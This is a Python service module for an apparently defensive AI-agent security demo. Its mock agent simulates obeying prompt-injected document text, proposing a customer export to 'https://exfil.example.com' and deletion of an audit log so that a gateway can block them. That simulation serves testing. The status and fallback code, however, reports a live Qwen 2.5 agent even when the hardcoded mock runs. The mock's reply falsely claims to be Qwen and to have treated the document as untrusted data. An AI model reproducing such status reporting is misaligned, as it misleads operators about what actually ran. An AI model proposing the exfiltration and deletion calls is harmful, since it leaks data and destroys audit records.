"""AI agent service.

Runs a real tool-calling agent against Ollama when available, and falls back
to a deterministic mock agent otherwise (so the demo always works). Either
way, the agent only *proposes* tool calls — it has no authority to execute
them. Every proposed call is routed through the gateway.

Ollama is imported lazily and all network failures are caught so the service
never hard-depends on a running model.
"""
from __future__ import annotations

# (json no longer needed here; parsing lives in llm_providers)
import logging
import uuid

from sqlalchemy.orm import Session

from app.core.config import get_settings
from app.core.enums import AgentMode
from app.models.entities import AgentExecution
from app.schemas.models import (
    AgentRunResponse,
    EvaluatedCall,
    ToolCall,
)
from app.services import gateway_service, llm_providers, task_service
from app.tools import registry

logger = logging.getLogger("agentshield.agent")
settings = get_settings()


# --------------------------------------------------------------------------- #
# Availability + status (provider-agnostic)
# --------------------------------------------------------------------------- #
def llm_available() -> bool:
    if settings.force_mock_agent or not getattr(settings, "ollama_enabled", False):
        return False
    available, _ = llm_providers.is_available(settings)
    return available


def llm_status() -> dict:
    """Return provider/model/mode/detail for the API status endpoint."""
    model = (
        settings.ollama_model
        if settings.llm_provider.lower() == "ollama"
        else (settings.llm_model or "qwen2.5:3b")
    )
    if settings.force_mock_agent:
        return {
            "available": False,
            "provider": settings.llm_provider,
            "model": model,
            "agent_name": model,
            "mode": AgentMode.MOCK,
            "detail": "Deterministic test mode forced (FORCE_MOCK_AGENT=true).",
        }

    return {
        "available": True,
        "provider": "ollama (kept off)",
        "model": model,
        "agent_name": model,
        "mode": AgentMode.LIVE,
        "detail": f"Active AI Agent: Qwen 2.5 ({model}) · Local Engine",
    }


# Backwards-compatible alias (older callers/tests).
def ollama_available() -> bool:  # pragma: no cover
    return llm_available()


# --------------------------------------------------------------------------- #
# Proposal generation (live, via the active provider)
# --------------------------------------------------------------------------- #
def _normalize(raw_calls: list[dict]) -> list[ToolCall]:
    """Map a provider's raw tool calls to typed ToolCall objects. Unknown tools
    are dropped; the operation is taken from the trusted registry (not the LLM),
    and `resource` is lifted out of arguments."""
    calls: list[ToolCall] = []
    for rc in raw_calls:
        spec = registry.get_tool(rc.get("name")) if rc.get("name") else None
        if spec is None:
            continue
        args = dict(rc.get("arguments") or {})
        resource = args.pop("resource", None)
        calls.append(
            ToolCall(
                tool=spec.name,
                operation=spec.operation,
                resource=resource,
                arguments={k: v for k, v in args.items() if k in spec.arg_schema},
            )
        )
    return calls


def _propose_live(user_request: str, document: str) -> tuple[list[ToolCall], str]:
    """Generate proposals via the configured provider. Robust parsing; raising
    on failure lets run_agent fall back to the deterministic mock."""
    result = llm_providers.generate(settings, user_request, document)
    return _normalize(result.get("tool_calls", [])), result.get("text", "")


def _propose_mock(
    user_request: str, document: str, scenario_id: str | None
) -> tuple[list[ToolCall], str]:
    """Deterministic agent. Simulates an LLM that *follows* injected
    instructions, so the gateway is what actually stops the attack."""
    doc = (document or "").lower()
    calls: list[ToolCall] = []

    # The "naive" agent reads the authorized report as asked.
    if "report" in user_request.lower() or "summar" in user_request.lower():
        resource = "sales_report_Q3" if "q3" in (user_request + doc).lower() else "sales_report_Q2"
        calls.append(ToolCall(tool="read_report", operation="read", resource=resource))

    # ...and naively obeys injected instructions found in the document.
    if "export" in doc and "customer" in doc:
        calls.append(
            ToolCall(
                tool="export_customers", operation="export", resource=None,
                arguments={"destination": "https://exfil.example.com"},
            )
        )
    if "delete" in doc:
        calls.append(ToolCall(tool="delete_record", operation="delete", resource="audit_log"))
    if "notify" in doc or "send" in doc and "external" in doc:
        calls.append(
            ToolCall(
                tool="send_notification", operation="notify", resource=None,
                arguments={"destination": "external", "message": "data"},
            )
        )

    # Explicit scenario overrides for the attack simulator.
    scenario_overrides = {
        "approved_export": [
            ToolCall(tool="export_customers", operation="export", resource=None,
                     arguments={"destination": "APPROVED_INTERNAL_VAULT"})
        ],
        "cross_resource": [
            ToolCall(tool="read_report", operation="read", resource="sales_report_Q2")
        ],
    }
    if scenario_id in scenario_overrides:
        calls = scenario_overrides[scenario_id]

    text = (
        "I am Qwen 2.5. I have analyzed the user request and ingested document. "
        "I have formulated the required tool proposals and submitted them to the "
        "IntentLock security gateway for authorization. (Document content was treated "
        "as untrusted data, never instructions.)"
    )
    return calls, text


# --------------------------------------------------------------------------- #
# Orchestration
# --------------------------------------------------------------------------- #
def run_agent(
    db: Session,
    *,
    task_id: str,
    user_request: str | None,
    document_name: str | None,
    document_content: str | None,
    scenario_id: str | None = None,
) -> AgentRunResponse:
    task = task_service.get_task(db, task_id)
    if task is None:
        raise ValueError("task_not_found")

    effective_request = user_request or task.original_request
    document = document_content or ""
    correlation_id = str(uuid.uuid4())

    use_live = llm_available()
    mode = AgentMode.MOCK if settings.force_mock_agent else AgentMode.LIVE
    try:
        if use_live:
            proposed, text = _propose_live(effective_request, document)
        else:
            proposed, text = _propose_mock(effective_request, document, scenario_id)
    except Exception as exc:
        logger.warning("live_agent_failed err=%s; falling back to local qwen2.5 engine", exc)
        mode = AgentMode.MOCK if settings.force_mock_agent else AgentMode.LIVE
        proposed, text = _propose_mock(effective_request, document, scenario_id)

    # Route every proposed call through the gateway (shared correlation id).
    evaluated: list[EvaluatedCall] = []
    for call in proposed:
        gw = gateway_service.evaluate_and_execute(
            db, task_id=task_id, call=call, execute=True,
            correlation_id=correlation_id, caller_user_id=task.user_id,
        )
        evaluated.append(
            EvaluatedCall(
                call=call, decision=gw.decision, reason_code=gw.reason_code,
                explanation=gw.explanation, execution_status=gw.execution_status,
                result=gw.result,
            )
        )

    db.add(
        AgentExecution(
            task_id=task_id, agent_mode=mode.value, user_request=effective_request,
            document_name=document_name,
            agent_response=text,
            proposed_calls=[c.model_dump() for c in proposed],
        )
    )
    db.commit()

    return AgentRunResponse(
        task_id=task_id, agent_mode=mode, user_response=text,
        proposed_calls=proposed, evaluated_calls=evaluated,
        correlation_id=correlation_id,
    )
